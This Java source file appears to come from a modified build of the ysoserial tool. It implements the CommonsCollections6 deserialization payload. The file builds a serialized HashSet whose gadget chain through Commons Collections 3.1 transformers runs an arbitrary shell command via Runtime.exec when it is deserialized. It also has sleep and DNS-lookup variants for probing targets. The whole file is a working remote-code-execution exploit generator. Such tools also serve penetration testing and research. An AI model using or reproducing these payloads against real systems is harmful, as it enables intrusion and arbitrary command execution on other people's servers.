package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.DynamicCommands;
import ysoserial.payloads.util.ObjectPayload;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()
    by @matthias_kaiser
*/
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.MATTHIASKAISER })
@DynamicCommands({DynamicCommands.EXEC_GLOBAL, DynamicCommands.EXEC_WIN, DynamicCommands.EXEC_UNIX, DynamicCommands.SLEEP, DynamicCommands.DNS})
public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<Serializable> {
	
	// federicodotta - All supported

    public Serializable getObject(final String command, String attackType) throws Exception {
        
		// federicodotta - All supported
    	
		if(attackType.equals("java_reverse_shell")) {
	    	
	    	System.out.println("**********************************");
	    	System.out.println(attackType + " not supported. Defaulting to ysoserial default");
	    	System.out.println("**********************************");
	    	System.out.println();
	    	
	    }
		
		Transformer[] transformers;
		
		// federicodotta - EXEC with args win and unix	
		if(attackType.equals("exec_win") || attackType.equals("exec_unix")) {
			
			String[] cmd;
			
			if(attackType.equals("exec_win")) {
				cmd =  new String[]{"cmd","/C",command};
			} else {
				cmd =  new String[]{"/bin/sh","-c",command};
			}
						
			final Object[] execArgs = new Object[] {cmd};			
			
			
			transformers = new Transformer[] {
					new ConstantTransformer(Runtime.class),
					new InvokerTransformer("getMethod", new Class[] {
						String.class, Class[].class }, new Object[] {
						"getRuntime", new Class[0] }),
					new InvokerTransformer("invoke", new Class[] {
						Object.class, Object[].class }, new Object[] {
						null, new Object[0] }),
					new InvokerTransformer("exec",
						new Class[] { String[].class }, execArgs),
					new ConstantTransformer(1) };			
			
		// federicodotta - Java native sleep				
		} else if(attackType.equals("sleep")) {
			
			final Object[] execArgs = new Object[] {Long.parseLong(command)};
			
			transformers = new Transformer[] {
					new ConstantTransformer(java.lang.Thread.class),
					new InvokerTransformer("getMethod", new Class[] {
						String.class, Class[].class }, new Object[] {
						"sleep", new Class[]{long.class} }),
					new InvokerTransformer("invoke", new Class[] {
						Object.class, Object[].class }, new Object[] {
						new Class[] { long.class }, execArgs }),
					new ConstantTransformer(1) };			

		// federicodotta - Java native DNS resolution			
		} else if(attackType.equals("dns")) {
			
			final String[] execArgs = new String[] { command };
			
			transformers = new Transformer[] {
					new ConstantTransformer(java.net.InetAddress.class),
					new InvokerTransformer("getMethod", new Class[] {
						String.class, Class[].class }, new Object[] {
						"getByName", new Class[]{java.lang.String.class} }),
					new InvokerTransformer("invoke", new Class[] {
						Object.class, Object[].class }, new Object[] {
						new Class[] { java.lang.String.class }, execArgs }),
					new ConstantTransformer(1) };		

		// ysoserial global exec (default option)	
		} else {			
			
			final String[] execArgs = new String[] { command };

			transformers = new Transformer[] {
					new ConstantTransformer(Runtime.class),
					new InvokerTransformer("getMethod", new Class[] {
						String.class, Class[].class }, new Object[] {
						"getRuntime", new Class[0] }),
					new InvokerTransformer("invoke", new Class[] {
						Object.class, Object[].class }, new Object[] {
						null, new Object[0] }),
					new InvokerTransformer("exec",
						new Class[] { String.class }, execArgs),
					new ConstantTransformer(1) };		
			
		}	

        Transformer transformerChain = new ChainedTransformer(transformers);

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);

        return map;

    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections6.class, args);
    }
}